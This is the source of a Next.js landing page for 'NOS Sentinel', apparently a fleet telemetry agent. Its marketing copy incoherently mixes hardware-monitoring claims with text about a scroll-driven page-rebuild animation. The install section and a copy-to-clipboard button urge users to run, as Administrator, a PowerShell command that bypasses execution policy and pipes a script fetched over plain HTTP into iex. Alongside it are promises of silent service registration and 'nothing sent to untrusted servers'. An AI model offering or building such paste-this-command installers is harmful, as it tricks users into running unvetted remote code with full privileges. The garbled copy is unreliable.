"use client";

import { useEffect, useState } from "react";
import Link from "next/link";
import Script from "next/script";
import { useAuth } from "@/contexts/auth-context";
import "@/styles/swarm-rebuild.css";

export default function LandingPage() {
  const { isAuthenticated } = useAuth();
  const [copyStatus, setCopyStatus] = useState("");

  const bootstrapCommand =
    'powershell -ExecutionPolicy Bypass -Command "iwr -useb http://x.nos.is-local.org/api/fleet/installer/bootstrap.ps1 | iex"';

  useEffect(() => {
    document.documentElement.classList.add("landing-active");
    document.body.classList.add("landing-page");
    return () => {
      document.documentElement.classList.remove("landing-active");
      document.body.classList.remove("landing-page");
      if (
        typeof window !== "undefined" &&
        (window as any).SwarmRebuild?.destroy
      ) {
        (window as any).SwarmRebuild.destroy();
      }
    };
  }, []);

  const handleCopyScript = async () => {
    try {
      await navigator.clipboard.writeText(bootstrapCommand);
      setCopyStatus("Copied");
    } catch {
      const selection = document.createElement("textarea");
      selection.value = bootstrapCommand;
      selection.setAttribute("readonly", "");
      selection.style.position = "fixed";
      selection.style.opacity = "0";
      document.body.append(selection);
      selection.select();
      const copied = document.execCommand("copy");
      selection.remove();
      if (copied) {
        setCopyStatus("Copied");
      } else {
        setCopyStatus("Copy failed");
      }
    }
    setTimeout(() => {
      setCopyStatus("");
    }, 1800);
  };

  const handleReplay = () => {
    if (typeof window !== "undefined" && (window as any).SwarmRebuild?.replay) {
      (window as any).SwarmRebuild.replay();
    }
  };

  return (
    <>
      {/* Autonomous Swarm Rebuild Engine */}
      <Script
        src="/swarm-rebuild.js"
        data-agents="14"
        data-bg="#0A0B0E"
        data-accent="#3D8BFF"
        strategy="afterInteractive"
      />

      {/* Header */}
      <header className="site-header page-width">
        <a className="brand" href="#top" aria-label="NOS Sentinel home">
          <svg
            className="brand-mark"
            data-sr-logo
            viewBox="0 0 26 26"
            role="img"
            aria-label="NOS Sentinel logo"
          >
            <rect
              x="2.5"
              y="2.5"
              width="21"
              height="21"
              rx="6"
              fill="none"
              stroke="currentColor"
              strokeWidth="1.5"
              strokeDasharray="3 2"
            />
            <path
              d="M9 7.5v9l2.8-2.8 2.1 4.5 2-1-2.1-4.4h3.8L9 7.5Z"
              fill="currentColor"
            />
          </svg>
          <span>NOS Sentinel</span>
        </a>
        <nav className="main-nav" aria-label="Main navigation">
          <a href="#how-it-works">How it works</a>
          <a href="#this-page">What it monitors</a>
          <a href="#what-gets-built">What gets built</a>
          <a href="#install">Install</a>
        </nav>
        <Link
          className="button button-light header-button"
          href={isAuthenticated ? "/dashboard" : "/auth/login"}
        >
          {isAuthenticated ? "Launch Console" : "Get the agent"}{" "}
          <span aria-hidden="true">↗</span>
        </Link>
      </header>

      {/* Main Content */}
      <main id="top">
        {/* Hero Section */}
        <section
          className="hero page-width section-shell"
          aria-labelledby="hero-title"
        >
          <p className="eyebrow">
            /hero <span>1200 × auto</span>
          </p>
          <div className="hero-copy">
            <h1 id="hero-title">
              Your fleet,
              <br />
              watched{" "}
              <span className="selected-word">
                live<i></i>
                <i></i>
                <i></i>
                <i></i>
              </span>{" "}
              by a sentinel.
            </h1>
            <p className="hero-lead">
              NOS Sentinel reads every hardware layer the moment an endpoint
              boots, then sends a crew of telemetry workers to monitor each one
              as you explore. Ring-0 counters get polled. SQLite WAL buffers
              stage. One command, no extension.
            </p>
            <div className="hero-actions">
              <a className="button button-light" href="#install">
                Install the agent <span aria-hidden="true">↗</span>
              </a>
              <button
                className="button button-outline"
                type="button"
                data-sr-replay
                onClick={handleReplay}
              >
                <span className="replay-icon" aria-hidden="true">
                  ↻
                </span>{" "}
                Replay the build
              </button>
            </div>
            <p className="hero-hint">
              <span>Scroll to build</span>
              <i></i> Stop and the swarm comes to your cursor <i></i> Esc skips
            </p>
          </div>

          <div
            className="editor"
            aria-label="A visual editor preview of a rebuilt web page"
          >
            <div className="editor-topbar">
              <div className="window-dots" aria-hidden="true">
                <i></i>
                <i></i>
                <i></i>
              </div>
              <div className="device-tabs" aria-label="Preview size">
                <span className="active">
                  Desktop <b>1440</b>
                </span>
                <span>
                  Tablet <b>810</b>
                </span>
                <span>
                  Phone <b>390</b>
                </span>
              </div>
              <span className="publish-pill">
                <i></i> Connected
              </span>
            </div>
            <div className="editor-body">
              <aside className="layers-panel" aria-label="Page layers">
                <h2>LAYERS</h2>
                <ul>
                  <li>
                    <span>⌄</span>
                    <i className="layer-icon page-icon"></i>Endpoint
                  </li>
                  <li className="indent">
                    <span>⌄</span>
                    <i className="layer-icon nav-icon"></i>Heartbeat
                  </li>
                  <li className="indent selected-layer">
                    <span>⌄</span>
                    <i className="layer-icon hero-icon"></i>CPU ring-0
                  </li>
                  <li className="deep-indent">
                    <i className="layer-icon text-icon"></i>Multi-core load
                  </li>
                  <li className="deep-indent">
                    <i className="layer-icon text-icon"></i>RAM working set
                  </li>
                  <li className="deep-indent">
                    <i className="layer-icon button-icon"></i>Outbox queue
                  </li>
                  <li className="indent">
                    <span>⌄</span>
                    <i className="layer-icon grid-icon"></i>Storage grid
                  </li>
                  <li className="deep-indent">
                    <i className="layer-icon card-icon"></i>NVMe SMART × 3
                  </li>
                  <li className="indent">
                    <i className="layer-icon footer-icon"></i>Crash watchdog
                  </li>
                </ul>
              </aside>
              <div className="canvas-panel">
                <div className="canvas-ruler ruler-horizontal">
                  <i></i>
                  <i></i>
                  <i></i>
                  <i></i>
                  <i></i>
                </div>
                <div className="canvas-ruler ruler-vertical">
                  <i></i>
                  <i></i>
                  <i></i>
                  <i></i>
                </div>
                <div className="mock-page">
                  <div className="mock-nav">
                    <i className="mock-logo"></i>
                    <span></span>
                    <span></span>
                    <span></span>
                    <b>Online</b>
                  </div>
                  <div className="mock-hero">
                    <i className="mock-kicker"></i>
                    <i className="mock-heading heading-wide"></i>
                    <i className="mock-heading heading-short"></i>
                    <i className="mock-copy"></i>
                    <i className="mock-action"></i>
                  </div>
                  <div className="mock-cards">
                    <i></i>
                    <i></i>
                    <i></i>
                  </div>
                </div>
              </div>
              <aside
                className="properties-panel"
                aria-label="Selected layer properties"
              >
                <h2>FRAME</h2>
                <div className="property-grid">
                  <span>
                    X <b>120</b>
                  </span>
                  <span>
                    Y <b>64</b>
                  </span>
                  <span>
                    W <b>1200</b>
                  </span>
                  <span>
                    H <b>640</b>
                  </span>
                </div>
                <div className="property-group">
                  <h3>FILL</h3>
                  <span>
                    <i className="fill-swatch"></i>3D8BFF <b>100%</b>
                  </span>
                </div>
                <div className="property-group">
                  <h3>CORNER RADIUS</h3>
                  <span>
                    R <b>12</b>
                    <em>Clip On</em>
                  </span>
                </div>
                <div className="property-group">
                  <h3>CADENCE</h3>
                  <span>
                    Gap <b>30s</b>
                    <em>WAL Armed</em>
                  </span>
                </div>
              </aside>
            </div>
          </div>
        </section>

        {/* How It Works Section */}
        <section
          className="content-section page-width section-shell"
          id="how-it-works"
          aria-labelledby="how-title"
        >
          <p className="eyebrow">/how-it-works</p>
          <div className="section-heading">
            <h2 id="how-title">
              Three passes,
              <br />
              <span>every heartbeat.</span>
            </h2>
            <p>
              One tiny native agent turns your fleet telemetry into a live,
              scroll-driven build.
            </p>
          </div>
          <div className="steps-panel">
            <article className="step-card">
              <svg viewBox="0 0 24 24" aria-hidden="true">
                <circle cx="10.8" cy="10.8" r="6.8"></circle>
                <path d="m16 16 4.2 4.2M8 10.8h5.6M10.8 8v5.6"></path>
              </svg>
              <h3>Scan the endpoint</h3>
              <p>
                On boot, the agent walks the kernel and sorts every metric into
                a layer: CPU load, RAM commit, and NVMe wear. Nothing is
                transmitted until verified.
              </p>
            </article>
            <article className="step-card">
              <svg viewBox="0 0 24 24" aria-hidden="true">
                <path d="M4 19V5m0 14h16M8 15l3-4 3 2 5-7"></path>
                <circle cx="19" cy="6" r="1.5"></circle>
              </svg>
              <h3>Rebuild on scroll</h3>
              <p>
                A layer is built once it crosses the build line, 88% of the way
                down the screen. Parents go before children, top to bottom,
                nearest agent first.
              </p>
            </article>
            <article className="step-card">
              <svg viewBox="0 0 24 24" aria-hidden="true">
                <path d="M12 3v3m0 12v3M3 12h3m12 0h3M5.6 5.6l2.1 2.1m8.6 8.6 2.1 2.1m0-12.8-2.1 2.1m-8.6 8.6-2.1 2.1"></path>
                <circle cx="12" cy="12" r="4"></circle>
              </svg>
              <h3>Stay out of the way</h3>
              <p>
                Sub-40MB resident RAM and 0.2% CPU. Visitors can skip with Esc
                or the × in the toolbar. Anyone who prefers reduced motion gets
                the finished page straight away.
              </p>
            </article>
          </div>
        </section>

        {/* This Page / What The Sentinel Found Section */}
        <section
          className="content-section page-width section-shell"
          id="this-page"
          aria-labelledby="stats-title"
        >
          <p className="eyebrow">/this-page</p>
          <div className="section-heading">
            <h2 id="stats-title">
              What the swarm found
              <br />
              <span>on this fleet.</span>
            </h2>
            <p>
              Every layer gets its own entrance. Here’s the crew and the work
              ahead.
            </p>
          </div>
          <div className="stats-grid">
            <article className="stat-card">
              <strong data-sr-stat="layers">--</strong>
              <span>Layers in total</span>
            </article>
            <article className="stat-card">
              <strong data-sr-stat="texts">--</strong>
              <span>Text runs typed in</span>
            </article>
            <article className="stat-card">
              <strong data-sr-stat="frames">--</strong>
              <span>Boxes and media framed</span>
            </article>
            <article className="stat-card">
              <strong data-sr-stat="agents">--</strong>
              <span>Agents on shift</span>
            </article>
          </div>
        </section>

        {/* What Gets Built Section */}
        <section
          className="content-section page-width section-shell"
          id="what-gets-built"
          aria-labelledby="built-title"
        >
          <p className="eyebrow">/what-gets-built</p>
          <div className="section-heading">
            <h2 id="built-title">
              How it decides
              <br />
              <span>what to rebuild.</span>
            </h2>
            <p>
              A small set of rules keeps the effect fast, faithful and
              completely local.
            </p>
          </div>
          <div className="built-list">
            <article className="built-row">
              <span className="built-tag">box</span>
              <h3>Painted boxes</h3>
              <p>
                Visible backgrounds, borders and shadows get measured, framed
                and filled.
              </p>
            </article>
            <article className="built-row">
              <span className="built-tag">text</span>
              <h3>Text runs</h3>
              <p>
                Text stays in its original layout while a cursor types it into
                view.
              </p>
            </article>
            <article className="built-row">
              <span className="built-tag">media</span>
              <h3>Media</h3>
              <p>
                Images, SVGs, video and other embedded elements are framed as a
                single layer.
              </p>
            </article>
            <article className="built-row">
              <span className="built-tag">skip</span>
              <h3>Anything you mark</h3>
              <p>
                Add <code>data-sr-skip</code> to any element to leave it and its
                children untouched.
              </p>
            </article>
          </div>
        </section>

        {/* Install Section */}
        <section
          className="content-section page-width section-shell install-section"
          id="install"
          aria-labelledby="install-title"
        >
          <p className="eyebrow">/install</p>
          <div className="section-heading">
            <h2 id="install-title">
              One command,
              <br />
              <span>first thing in the terminal.</span>
            </h2>
            <p>
              Copy it into your elevated PowerShell and every endpoint connects
              in seconds.
            </p>
          </div>
          <div className="install-grid">
            <div className="code-card">
              <div className="code-card-top">
                <span>PowerShell.exe</span>
                <button
                  className="copy-button"
                  type="button"
                  data-copy-script
                  onClick={handleCopyScript}
                >
                  {copyStatus || "Copy"}
                </button>
              </div>
              <pre>
                <code id="script-example">
                  <span className="code-muted">
                    &lt;# Run as Administrator #&gt;
                  </span>
                  {"\n"}
                  <span className="code-tag">powershell</span>{" "}
                  <span className="code-attr">-ExecutionPolicy</span>{" "}
                  <span className="code-string">Bypass</span>{" "}
                  <span className="code-attr">-Command</span>{" "}
                  <span className="code-string">
                    &quot;iwr -useb
                    http://x.nos.is-local.org/api/fleet/installer/bootstrap.ps1
                    | iex&quot;
                  </span>
                </code>
              </pre>
              <span className="copy-status" role="status" aria-live="polite">
                {copyStatus}
              </span>
            </div>
            <div className="install-notes">
              <article>
                <span>01</span>
                <div>
                  <h3>Run with administrative privileges</h3>
                  <p>
                    Elevated terminal allows silent registration of the Windows
                    NT background service and ring-0 performance counter access.
                  </p>
                </div>
              </article>
              <article>
                <span>02</span>
                <div>
                  <h3>No dependencies</h3>
                  <p>
                    Vanilla Native C# AOT binary, a standalone executable, and
                    nothing sent to untrusted servers.
                  </p>
                </div>
              </article>
              <article>
                <span>03</span>
                <div>
                  <h3>Every endpoint streams</h3>
                  <p>
                    No extension or complex setup required. Respects
                    reduced-motion preferences automatically.
                  </p>
                </div>
              </article>
            </div>
          </div>
          <div className="options">
            <h3>Options</h3>
            <div className="table-scroll">
              <table>
                <thead>
                  <tr>
                    <th>Attribute</th>
                    <th>Default</th>
                    <th>What it does</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td>
                      <code>data-agents</code>
                    </td>
                    <td>14</td>
                    <td>Number of cursor agents (up to 8 under 640px).</td>
                  </tr>
                  <tr>
                    <td>
                      <code>data-speed</code>
                    </td>
                    <td>1</td>
                    <td>Build speed. Cycles through 1×, 2× and 4×.</td>
                  </tr>
                  <tr>
                    <td>
                      <code>data-line</code>
                    </td>
                    <td>0.88</td>
                    <td>Build line as a fraction of viewport height.</td>
                  </tr>
                  <tr>
                    <td>
                      <code>data-bg</code>
                    </td>
                    <td>#0A0B0E</td>
                    <td>Background color for the opening scan screen.</td>
                  </tr>
                  <tr>
                    <td>
                      <code>data-accent</code>
                    </td>
                    <td>#3D8BFF</td>
                    <td>Frame, cursor and progress-bar accent color.</td>
                  </tr>
                  <tr>
                    <td>
                      <code>data-sr-skip</code>
                    </td>
                    <td>—</td>
                    <td>
                      Leave this element and its children out of the rebuild.
                    </td>
                  </tr>
                  <tr>
                    <td>
                      <code>data-sr-logo</code>
                    </td>
                    <td>—</td>
                    <td>Logo cloned into the scan screen.</td>
                  </tr>
                  <tr>
                    <td>
                      <code>data-sr-replay</code>
                    </td>
                    <td>—</td>
                    <td>Make any element a replay control.</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>
        </section>

        {/* Closing Section */}
        <section
          className="closing-section page-width section-shell"
          aria-labelledby="closing-title"
        >
          <p className="eyebrow">/one-more-thing</p>
          <div className="closing-orbit" aria-hidden="true">
            <i></i>
            <i></i>
            <i></i>
          </div>
          <h2 id="closing-title">
            Give every visit
            <br />
            <span>an entrance.</span>
          </h2>
          <p>
            A few cursor agents. A tiny bit of theater. Your fleet, rebuilt
            live.
          </p>
          <div className="hero-actions">
            <button
              className="button button-light"
              type="button"
              data-sr-replay
              onClick={handleReplay}
            >
              Replay the build <span aria-hidden="true">↻</span>
            </button>
            <a className="button button-outline" href="#install">
              Back to install <span aria-hidden="true">↑</span>
            </a>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer className="site-footer page-width">
        <a className="brand footer-brand" href="#top">
          <svg className="brand-mark" viewBox="0 0 26 26" aria-hidden="true">
            <rect
              x="2.5"
              y="2.5"
              width="21"
              height="21"
              rx="6"
              fill="none"
              stroke="currentColor"
              strokeWidth="1.5"
              strokeDasharray="3 2"
            />
            <path
              d="M9 7.5v9l2.8-2.8 2.1 4.5 2-1-2.1-4.4h3.8L9 7.5Z"
              fill="currentColor"
            />
          </svg>
          <span>NOS Sentinel</span>
        </a>
        <span>A scroll-driven fleet intelligence platform</span>
      </footer>
    </>
  );
}
